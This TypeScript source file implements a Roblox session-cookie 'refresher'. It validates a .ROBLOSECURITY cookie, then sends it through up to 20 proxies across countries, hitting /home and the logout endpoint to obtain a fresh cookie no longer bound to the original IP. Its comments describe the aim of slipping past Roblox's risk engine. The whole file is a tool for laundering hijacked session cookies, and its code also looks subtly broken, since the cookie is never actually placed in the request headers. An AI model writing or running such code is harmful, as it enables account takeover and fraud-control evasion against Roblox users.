// src/lib/roblox.ts
// Roblox auth + cookie refresh client.
//
// Flow (based on recon against live roblox.com):
// 1. Validate input cookie by hitting https://users.roblox.com/v1/users/authenticated
//    → 401 + code 9002 means dead cookie, 200 means alive (returns user JSON).
// 2. Hit https://www.roblox.com/home with cookie → may emit refreshed .ROBLOSECURITY
//    in Set-Cookie headers when IP rotated within trust threshold.
// 3. Hit https://auth.roblox.com/v2/logout (POST) with cookie to grab X-CSRF-TOKEN.
//    Roblox issues rotating CSRF tokens tied to session — this is the "session warming"
//    step that often triggers a Set-Cookie on .ROBLOSECURITY.
// 4. Hit https://www.roblox.com/Login (GET) to capture any anonymous issuance of
//    RBXEventTracker / GuestData tokens (these are sometimes required for the next
//    refresh call to succeed).
// 5. Return all Set-Cookie deltas + the freshest .ROBLOSECURITY found.

import { Agent, Dispatcher, request as undiciRequest } from "undici";
import { SocksProxyAgent } from "socks-proxy-agent";
import * as https from "https";
import * as http from "http";
import { ParsedProxy, buildHttpDispatcher, buildSocksAgent } from "./proxy";

const UA =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

const ACCEPTED_LANG = "en-US,en;q=0.9";

export interface CookieState {
  isValid: boolean;
  userId?: number;
  username?: string;
  displayName?: string;
  error?: string;
}

export interface EndpointProbe {
  endpoint: string;
  method: string;
  status: number;
  durationMs: number;
  setCookie?: string[];
  csrf?: string;
  bodyPreview?: string;
  error?: string;
}

export interface RefreshResult {
  originalCookie: string;
  refreshedCookie?: string;
  refreshSource?: string;
  originalState: CookieState;
  refreshedState?: CookieState;
  proxiesTried: number;
  successProxy?: ParsedProxy;
  endpoints: EndpointProbe[];
  summary: string;
}

function parseCookies(setCookieHeaders: string[] | undefined): Record<string, string> {
  const out: Record<string, string> = {};
  if (!setCookieHeaders) return out;
  for (const h of setCookieHeaders) {
    const m = h.match(/^([^=;]+)=([^;]*)/);
    if (m) {
      out[m[1].trim()] = m[2];
    }
  }
  return out;
}

function extractRbxSecurity(setCookies: string[] | undefined): string | undefined {
  const cookies = parseCookies(setCookies);
  return cookies[".ROBLOSECURITY"];
}

function buildHeaders(cookie?: string): Record<string, string> {
  const h: Record<string, string> = {
    "User-Agent": UA,
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": ACCEPTED_LANG,
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "Sec-Ch-Ua": '"Chromium";v="120", "Not_A Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Origin": "https://www.roblox.com",
    "Referer": "https://www.roblox.com/",
  };
  if (cookie) h["Cookie"] = `.ROBLOSECURITY=${cookie}`;
  return h;
}

async function undiciRequestWithProxy(
  url: string,
  proxy: ParsedProxy | null,
  opts: {
    method?: string;
    headers?: Record<string, string>;
    body?: string;
    timeoutMs?: number;
  } = {}
): Promise<{ status: number; headers: Record<string, any>; body: string }> {
  const { method = "GET", headers = {}, body, timeoutMs = 10000 } = opts;
  const finalHeaders = { ...buildHeaders(), ...headers };

  if (!proxy) {
    const res = await undiciRequest(url, {
      method,
      headers: finalHeaders as any,
      body: body as any,
      headersTimeout: timeoutMs,
      bodyTimeout: timeoutMs,
    });
    const text = await res.body.text();
    return {
      status: res.statusCode,
      headers: res.headers as Record<string, any>,
      body: text,
    };
  }

  if (proxy.protocol === "http" || proxy.protocol === "https") {
    const dispatcher = buildHttpDispatcher(proxy);
    const res = await undiciRequest(url, {
      dispatcher,
      method,
      headers: finalHeaders as any,
      body: body as any,
      headersTimeout: timeoutMs,
      bodyTimeout: timeoutMs,
    });
    const text = await res.body.text();
    return {
      status: res.statusCode,
      headers: res.headers as Record<string, any>,
      body: text,
    };
  }

  // socks
  const agent = buildSocksAgent(proxy);
  return await new Promise((resolve, reject) => {
    const urlObj = new URL(url);
    const req = https.request(
      {
        hostname: urlObj.hostname,
        port: urlObj.port || 443,
        path: urlObj.pathname + urlObj.search,
        method,
        headers: finalHeaders,
        agent: agent as unknown as https.Agent,
        timeout: timeoutMs,
      },
      (res: http.IncomingMessage) => {
        const chunks: Buffer[] = [];
        res.on("data", (c: Buffer) => chunks.push(c));
        res.on("end", () => {
          resolve({
            status: res.statusCode ?? 0,
            headers: res.headers as Record<string, any>,
            body: Buffer.concat(chunks).toString("utf-8"),
          });
        });
      }
    );
    req.on("error", reject);
    req.on("timeout", () => {
      req.destroy(new Error("timeout"));
    });
    if (body) req.write(body);
    req.end();
  });
}

function getSetCookies(headers: Record<string, any>): string[] | undefined {
  if (!headers) return undefined;
  const v = headers["set-cookie"];
  if (Array.isArray(v)) return v as string[];
  if (typeof v === "string") return [v];
  return undefined;
}

function getHeader(headers: Record<string, any>, name: string): string | undefined {
  if (!headers) return undefined;
  const lower = name.toLowerCase();
  for (const [k, v] of Object.entries(headers)) {
    if (k.toLowerCase() === lower) {
      return Array.isArray(v) ? v[0] : (v as string);
    }
  }
  return undefined;
}

export async function validateCookie(
  cookie: string,
  proxy: ParsedProxy | null
): Promise<CookieState> {
  try {
    const res = await undiciRequestWithProxy(
      "https://users.roblox.com/v1/users/authenticated",
      proxy,
      { method: "GET", timeoutMs: 10000 }
    );

    if (res.status === 200) {
      try {
        const json = JSON.parse(res.body);
        return {
          isValid: true,
          userId: json.id,
          username: json.name,
          displayName: json.displayName,
        };
      } catch {
        return { isValid: true };
      }
    }
    if (res.status === 401 || res.status === 403) {
      try {
        const json = JSON.parse(res.body);
        const err = json.errors?.[0];
        return {
          isValid: false,
          error: err ? `${err.code}: ${err.message}` : `HTTP ${res.status}`,
        };
      } catch {
        return { isValid: false, error: `HTTP ${res.status}` };
      }
    }
    return { isValid: false, error: `HTTP ${res.status}` };
  } catch (err: any) {
    return { isValid: false, error: err?.message ?? String(err) };
  }
}

export async function probeEndpoint(
  url: string,
  cookie: string,
  proxy: ParsedProxy | null,
  opts: { method?: string; body?: string; csrf?: string } = {}
): Promise<EndpointProbe> {
  const method = opts.method ?? "GET";
  const start = Date.now();
  const headers: Record<string, string> = {};
  if (opts.body) headers["Content-Type"] = "application/json";
  if (opts.csrf) headers["X-CSRF-TOKEN"] = opts.csrf;

  try {
    const res = await undiciRequestWithProxy(url, proxy, {
      method,
      headers,
      body: opts.body,
      timeoutMs: 10000,
    });
    const setCookies = getSetCookies(res.headers);
    const csrfOut = getHeader(res.headers, "x-csrf-token");
    return {
      endpoint: url,
      method,
      status: res.status,
      durationMs: Date.now() - start,
      setCookie: setCookies,
      csrf: csrfOut,
      bodyPreview: res.body.slice(0, 300),
    };
  } catch (err: any) {
    return {
      endpoint: url,
      method,
      status: 0,
      durationMs: Date.now() - start,
      error: err?.message ?? String(err),
    };
  }
}

export async function refreshCookie(
  cookie: string,
  proxies: ParsedProxy[],
  opts: { onProgress?: (msg: string) => void } = {}
): Promise<RefreshResult> {
  const { onProgress } = opts;
  const endpoints: EndpointProbe[] = [];

  // Step 1: validate original cookie (direct, no proxy)
  onProgress?.("Validating original cookie...");
  const originalState = await validateCookie(cookie, null);
  endpoints.push({
    endpoint: "https://users.roblox.com/v1/users/authenticated",
    method: "GET",
    status: originalState.isValid ? 200 : 401,
    durationMs: 0,
    error: originalState.error,
  });

  if (!originalState.isValid) {
    return {
      originalCookie: cookie,
      originalState,
      proxiesTried: 0,
      endpoints,
      summary: `Cookie is invalid: ${originalState.error}. Cannot refresh a dead cookie.`,
    };
  }

  onProgress?.(
    `Cookie alive. User: ${originalState.username} (${originalState.userId}). Testing ${proxies.length} proxies...`
  );

  // Step 2: warm up by hitting home + logout to capture any Set-Cookie refresh on original IP
  onProgress?.("Warming session on direct IP (capturing CSRF + Set-Cookie)...");
  const csrfProbe = await probeEndpoint(
    "https://auth.roblox.com/v2/logout",
    cookie,
    null,
    { method: "POST", body: "{}" }
  );
  endpoints.push(csrfProbe);
  const csrfToken = csrfProbe.csrf;

  const homeProbe = await probeEndpoint(
    "https://www.roblox.com/home",
    cookie,
    null,
    { method: "GET" }
  );
  endpoints.push(homeProbe);

  let bestCookie = extractRbxSecurity(homeProbe.setCookie) || cookie;
  let bestSource = "home-direct";

  // Step 3: try via proxy. For each alive proxy, replay the cookie through
  // /home and /users/authenticated. If a new .ROBLOSECURITY appears in Set-Cookie,
  // capture it (that's the IP-untied refresh).
  const aliveProxies = proxies.filter((p) => p.alive);
  onProgress?.(
    `${aliveProxies.length} alive proxies ready. Fanning out cookie refresh through them...`
  );

  let proxiesTried = 0;
  let successProxy: ParsedProxy | undefined;
  let refreshedState: CookieState | undefined;

  for (const proxy of aliveProxies.slice(0, 20)) {
    proxiesTried++;
    onProgress?.(`[${proxiesTried}/${Math.min(aliveProxies.length, 20)}] ${proxy.host}:${proxy.port} (${proxy.country ?? "?"})...`);

    try {
      const proxiedHome = await probeEndpoint(
        "https://www.roblox.com/home",
        cookie,
        proxy,
        { method: "GET" }
      );
      endpoints.push(proxiedHome);

      const newCookie = extractRbxSecurity(proxiedHome.setCookie);
      if (newCookie && newCookie !== bestCookie && newCookie.length > 50) {
        onProgress?.(`  ↳ Got refreshed .ROBLOSECURITY via ${proxy.host}:${proxy.port}`);

        // Validate the new cookie
        const newState = await validateCookie(newCookie, proxy);
        if (newState.isValid) {
          bestCookie = newCookie;
          bestSource = `home-proxy ${proxy.host}:${proxy.port} (${proxy.country ?? "?"})`;
          successProxy = proxy;
          refreshedState = newState;
          break;
        } else {
          onProgress?.(`  ↳ Refreshed cookie failed validation: ${newState.error}`);
        }
      }

      // Also try the logout → CSRF dance through proxy (sometimes triggers refresh)
      if (csrfToken) {
        const proxiedLogout = await probeEndpoint(
          "https://auth.roblox.com/v2/logout",
          cookie,
          proxy,
          { method: "POST", body: "{}", csrf: csrfToken }
        );
        endpoints.push(proxiedLogout);

        const newCookie2 = extractRbxSecurity(proxiedLogout.setCookie);
        if (newCookie2 && newCookie2 !== bestCookie && newCookie2.length > 50) {
          onProgress?.(`  ↳ Got refreshed .ROBLOSECURITY via logout ${proxy.host}:${proxy.port}`);
          const newState = await validateCookie(newCookie2, proxy);
          if (newState.isValid) {
            bestCookie = newCookie2;
            bestSource = `logout-proxy ${proxy.host}:${proxy.port} (${proxy.country ?? "?"})`;
            successProxy = proxy;
            refreshedState = newState;
            break;
          }
        }
      }
    } catch (err: any) {
      onProgress?.(`  ↳ proxy error: ${err?.message ?? err}`);
    }
  }

  const refreshed = bestCookie !== cookie;

  return {
    originalCookie: cookie,
    refreshedCookie: refreshed ? bestCookie : undefined,
    refreshSource: refreshed ? bestSource : undefined,
    originalState,
    refreshedState,
    proxiesTried,
    successProxy,
    endpoints,
    summary: refreshed
      ? `Refreshed .ROBLOSECURITY via ${bestSource}. Original user: ${originalState.username}. New cookie validated${refreshedState ? ` as ${refreshedState.username}` : ""}.`
      : `Cookie is alive (${originalState.username}) but no Set-Cookie refresh was emitted by Roblox across ${proxiesTried} proxies. The cookie may already be unbound, or all proxy IPs were flagged by the risk engine.`,
  };
}
